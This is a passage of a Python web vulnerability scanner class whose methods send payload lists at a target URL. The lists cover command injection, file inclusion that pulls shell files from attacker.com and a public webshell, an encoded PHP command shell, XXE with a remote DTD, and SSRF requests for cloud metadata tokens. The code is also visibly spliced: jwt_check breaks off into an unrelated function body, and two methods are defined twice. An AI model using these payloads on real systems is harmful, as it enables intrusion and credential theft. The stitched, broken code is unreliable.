        self._check_vulnerability(url, payloads, detect_patterns, "Cross-Site Scripting (XSS)")

    def command_injection_check(self, url: str):
        """Check for Command Injection vulnerabilities."""
        payloads = [
            "; ls -la",
            "& dir",
            "| cat /etc/passwd",
            "`id`",
            "$(whoami)",
            "; ping -c 3 127.0.0.1",
            "| net user",
            "& type C:\\Windows\\win.ini",
            "; uname -a",
            "| id",
            "& whoami",
            "; cat /proc/version",
            "| ver",
            "& echo %USERNAME%",
            "; env",
            "| set",
            "& ps -ef",
            "; netstat -an",
            "| ipconfig /all",
            "& ifconfig",
            "; echo 'vulnerable' > test.txt",
            "| echo 'vulnerable' > test.txt",
            "& echo 'vulnerable' > test.txt",
            "; rm test.txt",
            "| del test.txt",
            "& rm test.txt",
            "$(touch /tmp/test)",
            "`touch /tmp/test`",
            "| touch /tmp/test",
            "; touch /tmp/test",
            "& echo %PATH%",
            "| echo $PATH",
            "; echo $PATH",
            "& systeminfo",
            "| sysctl -a",
            "; sysctl -a",
            "& powershell Get-Process",
            "| ps aux",
            "; ps aux",
            "& net localgroup administrators",
            "| cat /etc/group",
            "; cat /etc/group"
        ] + self.custom_payloads
        detect_patterns = [
            "root:x:",
            "\\[font\\]",
            "uid=",
            "gid=",
            "groups=",
            "Linux",
            "Windows",
            "BSD",
            "GNU",
            "Darwin",
            "build",
            "version",
            "inet addr:",
            "IP Address",
            "Ethernet adapter",
            "LISTEN",
            "ESTABLISHED",
            "vulnerable",
            "Directory of",
            "Volume Serial Number",
            "Processor\\(s\\)",
            "System uptime",
            "PID",
            "COMMAND",
            "Administrator",
            "root:",
            "/bin/bash"
        ]
        self._check_vulnerability(url, payloads, detect_patterns, "Command Injection")

    def lfi_check(self, url: str):
        """Check for Local File Inclusion (LFI) vulnerabilities."""
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "/etc/passwd",
            "C:\\Windows\\win.ini",
            "/proc/self/environ",
            "/var/log/apache/access.log",
            "/var/log/apache2/access.log",
            "/var/log/httpd/access_log",
            "../../../../../../../../../../../../etc/passwd",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini",
            "file:///etc/passwd",
            "file://C:\\Windows\\win.ini",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
            "expect://id",
            "php://filter/read=string.rot13/resource=index.php",
            "php://filter/convert.iconv.utf-8.utf-16/resource=index.php",
            "php://filter/convert.base64-encode/resource=../../../../../etc/passwd",
            "phar://test.phar/test.txt",
            "/var/www/html/index.php",
            "/home/user/.bash_history",
            "/root/.bash_history",
            "/etc/httpd/logs/access.log",
            "/etc/httpd/logs/error.log",
            "/var/log/apache2/error.log",
            "/var/log/apache2/access.log",
            "/var/log/nginx/error.log",
            "/var/log/nginx/access.log",
            "/var/log/vsftpd.log",
            "/var/log/sshd.log",
            "/var/log/mail.log",
            "/var/log/mysql/error.log",
            "/proc/self/cmdline",
            "/proc/self/stat",
            "/proc/self/status",
            "/proc/self/fd/0",
            "/proc/self/fd/1",
            "/proc/self/fd/2",
            "/proc/self/maps"
        ] + self.custom_payloads
        detect_patterns = [
            "root:x:",
            "\\[font\\]",
            "\\[extensions\\]",
            "HTTP_USER_AGENT",
            "HTTP_ACCEPT",
            "HTTP_HOST",
            "HTTP_ACCEPT_ENCODING",
            "DOCUMENT_ROOT",
            "PATH=",
            "COMSPEC=",
            "PATHEXT=",
            "WINDIR=",
            "SHELL=",
            "HISTFILE=",
            "PWD=",
            "USER=",
            "GROUP=",
            "APACHE_RUN_USER=",
            "APACHE_RUN_GROUP=",
            "\\[boot loader\\]",
            "\\[operating systems\\]",
            "multi\\(0\\)disk\\(0\\)rdisk\\(0\\)",
            "PROCESSOR_IDENTIFIER",
            "PROCESSOR_LEVEL",
            "PROCESSOR_REVISION",
            "ProgramFiles",
            "CommonProgramFiles",
            "SystemRoot",
            "HOMEDRIVE",
            "HOMEPATH",
            "LOCALAPPDATA",
            "APPDATA",
            "\\[MCI Extensions\\.BAK\\]",
            "\\[files\\]",
            "\\[Mail\\]",
            "MAPI=1"
        ]
        self._check_vulnerability(url, payloads, detect_patterns, "Local File Inclusion (LFI)")

    def rfi_check(self, url: str):
        """Check for Remote File Inclusion (RFI) vulnerabilities."""
        payloads = [
            "http://evil.com/shell.txt",
            "https://pastebin.com/raw/PHShhbYz",
            "ftp://attacker.com/shell.php",
            "http://127.0.0.1/shell.php",
            "https://raw.githubusercontent.com/tennc/webshell/master/php/webshell.php",
            "http://127.0.0.1:8080/shell.php",
            "file:///etc/passwd",
            "file://C:\\Windows\\win.ini",
            "\\\\attacker.com\\share\\shell.php",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
            "http://attacker.com/shell.txt?",
            "https://attacker.com/shell.php#",
            "//attacker.com/shell.php",
            "http://attacker.com/shell.php?test=",
            "https://attacker.com/shell.php?id=1",
            "ftp://anonymous:anonymous@attacker.com/shell.php",
            "sftp://attacker.com/shell.php",
            "http://169.254.169.254/latest/meta-data/",
            "gopher://attacker.com/_GET%20/shell.php",
            "dict://attacker.com:11111/",
            "ldap://attacker.com:389",
            "tftp://attacker.com:69/shell.php",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
        ] + self.custom_payloads
        detect_patterns = [
            "root:x:",
            "\\[font\\]",
            "\\[extensions\\]",
            "HTTP_USER_AGENT",
            "HTTP_ACCEPT",
            "HTTP_HOST",
            "HTTP_ACCEPT_ENCODING",
            "DOCUMENT_ROOT",
            "PATH=",
            "COMSPEC=",
            "PATHEXT=",
            "WINDIR=",
            "SHELL=",
            "HISTFILE=",
            "PWD=",
            "USER=",
            "GROUP=",
            "APACHE_RUN_USER=",
            "APACHE_RUN_GROUP=",
            "<\\?php",
            "shell_exec",
            "system\\(",
            "exec\\(",
            "passthru\\(",
            "eval\\(",
            "base64_decode\\(",
            "gzinflate\\(",
            "gzuncompress\\(",
            "str_rot13\\(",
            "preg_replace\\(.*/e",
            "assert\\(",
            "create_function\\(",
            "include\\(",
            "require\\(",
            "include_once\\(",
            "require_once\\("
        ]
        self._check_vulnerability(url, payloads, detect_patterns, "Remote File Inclusion (RFI)")

    def xxe_check(self, url: str):
        """Check for XML External Entity (XXE) vulnerabilities."""
        payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///c:/windows/win.ini">]><data>&file;</data>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]><data>&send;</data>',
            '<?xml version="1.0"?><!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><replace>&xxe;</replace>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
            '<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>',
            '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "https://attacker.com/evil.dtd">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>&xxe;</foo>'
        ] + self.custom_payloads
        detect_patterns = [
            "root:x:",
            "\\[font\\]",
            "\\[extensions\\]",
            "uid=",
            "gid=",
            "groups=",
            "<\\?php",
            "HTTP_USER_AGENT",
            "HTTP_ACCEPT",
            "HTTP_HOST",
            "file:///",
            "php://filter",
            "expect://",
            "data://text/plain",
            "SYSTEM",
            "<!ENTITY",
            "<!DOCTYPE",
            "<!ELEMENT"
        ]
        self._check_vulnerability(url, payloads, detect_patterns, "XML External Entity (XXE)")

    def csrf_token_check(self, url: str, form_selector: str = 'form'):
        """Check for presence of CSRF tokens in forms."""
        self._log_info(f"Checking for CSRF tokens: {url}")
        try:
            response = self._make_request(url)
            if not response:
                return

            soup = BeautifulSoup(response.content, 'html.parser')
            forms = soup.select(form_selector)
            
            if not forms:
                self._log_warning(f"No forms found on {url}")
                return

            for form in forms:
                csrf_token = form.find("input", {"name": re.compile(r"csrf|token", re.I)})
                if csrf_token:
                    self._log_success(f"CSRF Token found in form on {url}")
                    return
            
            self._log_warning(f"No CSRF Token found in forms on {url}")
        except Exception as e:
            self._log_error(f"Error checking CSRF Token in {url}: {e}")

    def clickjacking_check(self, url: str):
        """Check for clickjacking protection headers."""
        self._log_info(f"Checking for clickjacking protection: {url}")
        try:
            response = self._make_request(url)
            if not response:
                return

            clickjacking_headers = ['X-Frame-Options', 'Content-Security-Policy']
            
            for header in clickjacking_headers:
                if header in response.headers:
                    self._log_success(f"Clickjacking protection found: {header} header present on {url}")
                    return
            
            self._log_warning(f"No clickjacking protection found on {url}")
        except Exception as e:
            self._log_error(f"Error checking clickjacking protection for {url}: {e}")

    def cors_misconfig_check(self, url: str):
        """Check for CORS misconfiguration."""
        self._log_info(f"Checking for CORS misconfiguration: {url}")
        try:
            headers = {'Origin': 'https://evil.com'}
            response = self._make_request(url, headers=headers)
            if not response:
                return

            if 'Access-Control-Allow-Origin' in response.headers:
                if response.headers['Access-Control-Allow-Origin'] == '*':
                    self._log_vulnerability("CORS Misconfiguration", url, "Access-Control-Allow-Origin set to wildcard (*)")
                elif response.headers['Access-Control-Allow-Origin'] == 'https://evil.com':
                    self._log_vulnerability("CORS Misconfiguration", url, "Access-Control-Allow-Origin reflects arbitrary origin")
                else:
                    self._log_success(f"CORS seems to be properly configured on {url}")
            else:
                self._log_info(f"No CORS headers found on {url}")
        except Exception as e:
            self._log_error(f"Error checking CORS configuration for {url}: {e}")

    def ssl_tls_check(self, url: str):
        """Check SSL/TLS configuration."""
        self._log_info(f"Checking SSL/TLS configuration: {url}")
        try:
            parsed_url = urlparse(url)
            hostname = parsed_url.hostname
            port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)

            context = ssl.create_default_context()
            with socket.create_connection((hostname, port)) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as secure_sock:
                    cert = secure_sock.getpeercert()
                    
                    if cert['notAfter']:
                        expiration_date = ssl.cert_time_to_seconds(cert['notAfter'])
                        current_time = time.time()
                        if expiration_date < current_time:
                            self._log_vulnerability("SSL/TLS", url, "Certificate has expired")
                        elif expiration_date - current_time < 30 * 24 * 60 * 60:  # 30 days
                            self._log_warning(f"Certificate for {url} will expire soon")
                    
                    cipher = secure_sock.cipher()
                    if cipher[0] in ['DES', '3DES', 'RC4', 'MD5']:
                        self._log_vulnerability("SSL/TLS", url, f"Weak cipher suite in use: {cipher[0]}")
                    
                    version = secure_sock.version()
                    if version == "TLSv1" or version == "TLSv1.1":
                        self._log_vulnerability("SSL/TLS", url, f"Outdated TLS version in use: {version}")
                    
                    
                    self._log_success(f"SSL/TLS check completed for {url}")
        except ssl.SSLError as e:
            self._log_vulnerability("SSL/TLS", url, f"SSL/TLS error: {str(e)}")
        except Exception as e:
            self._log_error(f"Error checking SSL/TLS configuration for {url}: {e}")

    def http_security_headers_check(self, url: str):
        """Check for important HTTP security headers."""
        self._log_info(f"Checking HTTP security headers: {url}")
        try:
            response = self._make_request(url)
            if not response:
                return

            security_headers = {
                'Strict-Transport-Security': 'Missing HSTS header',
                'X-Content-Type-Options': 'Missing X-Content-Type-Options header',
                'X-XSS-Protection': 'Missing or outdated X-XSS-Protection header',
                'Content-Security-Policy': 'Missing Content Security Policy (CSP) header',
                'X-Frame-Options': 'Missing X-Frame-Options header',
                'Referrer-Policy': 'Missing Referrer-Policy header'
            }

            for header, message in security_headers.items():
                if header not in response.headers:
                    self._log_warning(f"{message} on {url}")
                else:
                    self._log_success(f"{header} header found on {url}")

            # Check for Server header disclosure
            if 'Server' in response.headers:
                self._log_warning(f"Server header disclosure on {url}: {response.headers['Server']}")

        except Exception as e:
            self._log_error(f"Error checking HTTP security headers for {url}: {e}")

    def open_redirect_check(self, url: str):
        """Check for open redirect vulnerabilities."""
        self._log_info(f"Checking for open redirect vulnerability: {url}")
        payloads = [
            "//evil.com",
            "https://evil.com",
            "//google.com%2f@evil.com",
            "https://evil.com/fake-login",
            "//evil.com/fake-login",
            "/\/\evil.com",
            "\/\/evil.com",
            "https:evil.com",
            "http:evil.com",
            "https:\\evil.com",
            "http:\\evil.com",
            "//evil%E3%80%82com",
            "\\evil.com",
            "http://evil.com",
            "https://evil.com",
            "https://evil.com%2f%2f",
            "//evil%00.com",
            "https://evil%E3%80%82com"
        ]
        
        try:
            parsed_url = urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            for payload in payloads:
                test_url = f"{url}?redirect={quote(payload)}"
                response = self._make_request(test_url, allow_redirects=False)
                
                if response and response.is_redirect:
                    location = response.headers.get('Location', '')
                    if any(evil_domain in location.lower() for evil_domain in ['evil.com', 'google.com']):
                        self._log_vulnerability("Open Redirect", url, f"Possible open redirect found with payload: {payload}")
                        return
            
            self._log_success(f"No open redirect vulnerability found on {url}")
        except Exception as e:
            self._log_error(f"Error checking for open redirect on {url}: {e}")

    def insecure_deserialization_check(self, url: str):
        """Check for insecure deserialization vulnerabilities."""
        self._log_info(f"Checking for insecure deserialization: {url}")
        payloads = [
            "O:8:\"stdClass\":0:{}",
            "a:2:{i:0;s:4:\"test\";i:1;s:4:\"test\";}",
            "YToyOntpOjA7czo0OiJ0ZXN0IjtpOjE7czo0OiJ0ZXN0Ijt9",  # base64 encoded PHP serialized data
            "{\"rce\":\"passthru('id');\"}",
            "eyJyY2UiOiJwYXNzdGhydSgnaWQnKTsifQ=="  # base64 encoded JSON
        ]
        
        detect_patterns = [
            "O:[0-9]+:\"[a-zA-Z0-9_]+\":[0-9]+:{",
            "a:[0-9]+:{",
            "uid=",
            "gid=",
            "groups=",
            "PHP Fatal error:",
            "Uncaught exception",
            "Unserialize failed"
        ]
        
        try:
            for payload in payloads:
                response = self._make_request(url, method='POST', data={'data': payload})
                if not response:
                    continue
                
                for pattern in detect_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        self._log_vulnerability("Insecure Deserialization", url, f"Possible insecure deserialization with payload: {payload}")
                        return
            
            self._log_success(f"No obvious insecure deserialization vulnerability found on {url}")
        except Exception as e:
            self._log_error(f"Error checking for insecure deserialization on {url}: {e}")

    def ssrf_check(self, url: str):
        """Check for Server-Side Request Forgery (SSRF) vulnerabilities."""
        self._log_info(f"Checking for SSRF vulnerability: {url}")
        payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://[::1]",
            "http://169.254.169.254",  # AWS metadata
            "http://metadata.google.internal",  # Google Cloud metadata
            "http://169.254.169.254/latest/meta-data/",
            "https://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://169.254.169.254/metadata/v1/maintenance",
            "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
            "file:///etc/passwd",
            "file://C:/Windows/win.ini",
            "gopher://localhost:3306/_",
            "dict://localhost:11211/stat",
            "ftp://localhost/",
            "https://localhost:443/",
            "http://[0:0:0:0:0:ffff:127.0.0.1]",
            "http://127.127.127.127",
            "http://127.0.0.0",
            "http://2130706433",  # Decimal representation of 127.0.0.1
            "http://0x7f000001",  # Hex representation of 127.0.0.1
            "http://017700000001",  # Octal representation of 127.0.0.1
            "http://0",
            "http://0.0.0.0:22",
            "http://0177.0000.0000.0001",
            "http://[::]:22",
            "http://[::]",
            "http://0000::1:22",
            "http://[0:0:0:0:0:ffff:127.0.0.1]:22",
            "http://①②⑦.⓪.⓪.①"
        ]
        
        detect_patterns = [
            "root:x:",
            "\\[font\\]",
            "\\[extensions\\]",
            "uid=",
            "gid=",
            "groups=",
            "LISTEN",
            "ESTABLISHED",
            "computeMetadata",
            "ami-id",
            "instance-id",
            "accountId"
        ]
        
        try:
            for payload in payloads:
                test_url = f"{url}?url={quote(payload)}"
                response = self._make_request(test_url)
                if not response:
                    continue
                
                for pattern in detect_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        self._log_vulnerability("SSRF", url, f"Possible SSRF vulnerability with payload: {payload}")
                        return
            
            self._log_success(f"No obvious SSRF vulnerability found on {url}")
        except Exception as e:
            self._log_error(f"Error checking for SSRF on {url}: {e}")

    def jwt_check(self, url: str):
        """Check for JSON Web Token (JWT) vulnerabilities."""
        self._log_info(f"Checking for JWT vulnerabilities: {url}")
        
        # Helper function to create a weak JWT
        def create_weak_jwt(algorithm='none'):
            header = base64.b64encode(json.dumps({"alg": algorithm, "typ": "JWT"}).encode()).decode().rstrip('=')
            headers = {'User-Agent': self.generate_random_user_agent()}
            response = self.session.get(url, headers=headers)
            response.raise_for_status()
            return BeautifulSoup(response.content, 'html.parser')
        except requests.RequestException as e:
            print(f"Request failed for {url}: {e}")
            return None

    def _log_result(self, result_type, url):
        with open(f"{result_type}-injection.txt", "a") as f:
            f.write(f"[{result_type} Found] {url}\n")
            print(f"[{result_type} Found] {url}")

    def _check_vulnerability(self, url, payloads, detect_patterns, result_type):
        try:
            soup = self._make_request(url)
            if soup:
                print(f"[Scanning {result_type} Target {url}]")
                for payload in payloads:
                    try:
                        response = self.session.get(url + payload)
                        soup_payload = BeautifulSoup(response.content, 'html.parser')
                        if any(re.search(pattern, str(soup_payload), re.IGNORECASE) for pattern in detect_patterns):
                            self._log_result(result_type, url)
                            return
                    except requests.RequestException as e:
                        print(f"Request failed for {url + payload}: {e}")
            else:
                print("[Provide URL with parameters]")
        except Exception as e:
            print(f"Error scanning {result_type} in {url}: {e}")

    def sql_check(self, url):
        """Check for SQL injection vulnerabilities."""
        payloads = ["'", "2%5c", "2'><", "%22"]
        detect_patterns = ["SQL syntax", "Microsoft.+Database", "Incorrect syntax", "unterminated.+quote"]
        self._check_vulnerability(url, payloads, detect_patterns, "SQL")

    def xss_check(self, url):
        """Check for cross-site scripting (XSS) vulnerabilities."""
        payloads = [
            "<script>alert('test')</script>",
            "<img src=x onerror=alert('test');>",
            "><script>alert('test')</script>",
        ]
        detect_patterns = ["<script>alert('test')</script>", "alert('test');"]
        self._check_vulnerability(url, payloads, detect_patterns, "XSS")

    def rce_check(self, url):
        payloads = [
            ';${@print(md5("test"))}',
            ';uname;',
            '&&dir',
            ';${@print(system("ls -la"))}',
            '&& type C:\\Windows\\System32\\drivers\\etc\\hosts'
        ]
        detect_patterns = [
            "51107ed95250b4099a0f481221d56497",
            "Linux",
            "Volume.+Serial",
            "total"
        ]
    
        self._check_vulnerability(url, payloads, detect_patterns, "RCE")

    def csrf_token_check(self, url, form_selector='form'):
        """Check for presence of CSRF tokens in forms."""
        try:
            soup = self._make_request(url)
            if soup:
                forms = soup.select(form_selector)
                for form in forms:
                    csrf_token = form.find("input", {"name": "csrf_token"})
                    if csrf_token:
                        print(f"[CSRF Token Found] {url}")
                        return
                print("[No CSRF Token Found]")
            else:
                print("[Provide URL with parameters]")
        except Exception as e:
            print(f"Error checking CSRF Token in {url}: {e}")

    def clickjacking_check(self, url):
        """Check for clickjacking protection headers."""
        try:
            headers = {'X-Frame-Options': 'deny'}
            response = self.session.get(url, headers=headers)
            if 'X-Frame-Options' in response.headers:
                print(f"[Clickjacking Protection Found] {url}")
            else:
                print("[No Clickjacking Protection Found]")
        except requests.RequestException as e:
            print(f"Request failed for {url}: {e}")
            


    def generate_random_string(self, length=10):
        """Generate a random string of given length."""
        letters_digits = string.ascii_letters + string.digits
        return ''.join(random.choice(letters_digits) for _ in range(length))

    def generate_random_email(self):
        """Generate a random email address."""
        username = self.generate_random_string(8)
        domain = random.choice(['example.com', 'test.com', 'domain.com'])
        return f"{username}@{domain}"

    def hash_string(self, input_string, algorithm='sha256'):
        """Hash a string using specified algorithm (default: SHA-256)."""
        if algorithm == 'md5':
            return hashlib.md5(input_string.encode()).hexdigest()
        elif algorithm == 'sha256':
            return hashlib.sha256(input_string.encode()).hexdigest()
        else:
            raise ValueError(f"Unsupported hashing algorithm: {algorithm}")

    def encode_base64(self, input_string):
        """Encode a string to base64."""
        return base64.b64encode(input_string.encode()).decode()

    def decode_base64(self, encoded_string):
        """Decode a base64 encoded string."""
        return base64.b64decode(encoded_string).decode()
    
    def encode_url(self, input_url):
        """Encode a URL fully."""
        return quote(input_url, safe='/:?=&')

    def decode_url(self, encoded_url):
        """Decode a fully encoded URL."""
        return unquote(encoded_url)

    def parse_url(self, url):
        """Parse URL into components."""
        parsed_url = urlparse(url)
        return {
            'scheme': parsed_url.scheme,
            'netloc': parsed_url.netloc,
            'path': parsed_url.path,
            'params': parsed_url.params,
            'query': parsed_url.query,
            'fragment': parsed_url.fragment
        }

    def build_url(self, base_url, path='', params=None):
        """Build a URL from base URL, optional path, and query parameters."""
        parsed_base_url = urlparse(base_url)
        if params:
            parsed_params = '&'.join([f"{key}={value}" for key, value in params.items()])
            return urljoin(base_url, f"{parsed_base_url.path}/{path}?{parsed_params}")
        else:
            return urljoin(base_url, f"{parsed_base_url.path}/{path}")

    def parse_query_params(self, url):
        """Parse query parameters from URL."""
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        return {key: value[0] for key, value in query_params.items()}

    def json_to_dict(self, json_string):
        """Convert JSON string to Python dictionary."""
        try:
            return json.loads(json_string)
        except json.JSONDecodeError as e:
            print(f"Error decoding JSON: {e}")
            return {}

    def dict_to_json(self, python_dict):
        """Convert Python dictionary to JSON string."""
        try:
            return json.dumps(python_dict)
        except TypeError as e:
            print(f"Error encoding to JSON: {e}")
            return ""

    def parse_html_form(self, html_content):
        """Parse HTML content and extract form elements."""
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            forms = soup.find_all('form')
            parsed_forms = []
            for form in forms:
                form_data = {}
                form_data['action'] = form.get('action', '')
                form_data['method'] = form.get('method', 'get').lower()
                form_data['inputs'] = []
                for input_tag in form.find_all('input'):
                    input_data = {}
                    input_data['type'] = input_tag.get('type', 'text').lower()
                    input_data['name'] = input_tag.get('name', '')
                    input_data['value'] = input_tag.get('value', '')
                    form_data['inputs'].append(input_data)
                parsed_forms.append(form_data)
            return parsed_forms
        except Exception as e:
            print(f"Error parsing HTML form: {e}")
            return []

    def check_http_methods(self, url, allowed_methods=['GET', 'POST']):
        """Check allowed HTTP methods for a URL."""
        try:
            response = self.session.options(url)
            if 'Allow' in response.headers:
                allowed = response.headers['Allow'].split(', ')
                disallowed_methods = [method for method in allowed_methods if method not in allowed]
                if disallowed_methods:
                    print(f"[Disallowed HTTP Methods] {url} - {', '.join(disallowed_methods)}")
                else:
                    print(f"[Allowed HTTP Methods] {url} - {', '.join(allowed_methods)}")
            else:
                print(f"[HTTP Methods Unknown] {url}")
        except requests.RequestException as e:
            print(f"Request failed for {url}: {e}")

    def generate_random_user_agent(self):
        """Generate a random User-Agent string."""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36", 
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
            "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25", 
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
            "Mozilla/5.0 (X11; Mageia; Linux x86_64; rv:10.0.9) Gecko/20100101 Firefox/10.0.9",
            "Mozilla/5.0 (Android; U; Android; pl; rv:1.9.2.8) Gecko/20100202 Firefox/3.5.8", 
            "Avant Browser/1.2.789rel1 (http://www.avantbrowser.com)",
			"Baiduspider ( http://www.baidu.com/search/spider.htm)",
			"BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103",
			"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/5.0.3.3 UP.Link/5.1.2.12 (Google WAP Proxy/1.0)",
			"BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
			"BlackBerry8320/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/100",
			"BlackBerry8330/4.3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/105",
			"BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102",

        ]
        return random.choice(user_agents)

